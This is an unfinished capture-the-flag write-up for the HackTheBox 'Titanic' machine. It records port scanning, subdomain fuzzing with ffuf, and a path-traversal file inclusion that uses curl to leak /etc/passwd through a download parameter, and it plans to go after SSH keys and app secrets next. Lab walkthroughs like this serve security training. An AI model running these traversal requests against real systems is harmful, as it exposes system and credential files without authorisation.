# HTB - Titanic

**IP Address:** `10.10.11.55`  
**OS:** Ubuntu  
**Difficulty:** Easy  
**Tags:** LFI, Python Flask, Subdomain Enumeration, File Disclosure

---

## 1. Port Scanning

### 1.1 Nmap Scan

```bash
nmap -sC -sV 10.10.11.55
```

Open Ports:

- 22/tcp → SSH (OpenSSH 8.9p1 Ubuntu)
- 80/tcp → HTTP (Apache 2.4.52 + Werkzeug 3.0.3 Python/3.10.12)

---

## 2. Subdomain Enumeration

### 2.1 FFUF Command

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb/ -H "Host: FUZZ.titanic.htb" -fc 301
```

✅ Found subdomain: `dev.titanic.htb`

Updated `/etc/hosts`:

```
10.10.11.55 dev.titanic.htb
```

---

## 3. Web Discovery on dev.titanic.htb

Inspected available files on the dev site.

Found: `app.py` but with no sensitive info.

Tried **Local File Inclusion (LFI)** using path traversal:

```bash
curl --path-as-is http://titanic.htb/download?ticket=../../../etc/passwd
```

✅ `/etc/passwd` successfully leaked  
Discovered system usernames including:

- `developer`

---

## 4. Pending Next Step

Usernames found, and confirmed LFI vulnerability.  
The next steps would involve:

- Trying to disclose other sensitive files (e.g., SSH keys, app secrets)
- Exploring login vectors (SSH or Web)
- Escalating via readable local files

---

🚧 **MACHINE IN PROGRESS**

(Upload the next part when ready to continue documenting.)

